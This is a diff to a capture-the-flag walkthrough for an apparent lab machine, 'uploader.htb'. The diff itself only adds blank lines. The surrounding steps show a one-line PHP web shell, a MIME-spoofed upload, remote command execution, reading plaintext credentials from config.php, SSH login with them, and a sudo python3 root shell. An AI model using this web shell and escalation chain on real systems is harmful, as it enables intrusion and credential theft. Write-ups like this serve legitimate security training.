@@ -77,22 +77,27 @@ echo '<?php system($_GET["cmd"]); ?>' > shell.php5
 Upload with spoofed MIME:
 curl -X POST http://uploader.htb/panel/index.php \
   -F "file=@shell.php5;type=image/jpeg"
+  
   ![Nmap Scan](./Screenshot_2026-06-26_13-49-16.png)
 
 #### STEP 5:- RCE
 curl "http://uploader.htb/uploads/shell.php5?cmd=id"
 Output: uid=33(www-data)
+
 ![Nmap Scan](./Screenshot_2026-06-26_13-49-29.png)
 
 #### STEP 6:- Credential Discovery
 curl "http://uploader.htb/uploads/shell.php5?cmd=cat+/var/www/html/config.php"
 Output: ayush : ayush@123
+
 ![Nmap Scan](./Screenshot_2026-06-26_13-49-39.png)
 
 ### STEP 7:- Lateral Movement
 ssh ayush@{MACHINE_IP}
 ![Nmap Scan](./Screenshot_2026-06-26_13-49-51.png)
+
 cat /home/ayush/user.txt
+
 ![Nmap Scan](./Screenshot_2026-06-26_13-50-04.png)
 
 ### STEP 8:- Privilege Escalation
@@ -102,4 +107,5 @@ Output: (ALL) NOPASSWD: /usr/bin/python3
 
 sudo python3 -c 'import os; os.system("/bin/bash")'
 ![Nmap Scan](./Screenshot_2026-06-26_13-50-24.png)
+
 cat /root/root.txt
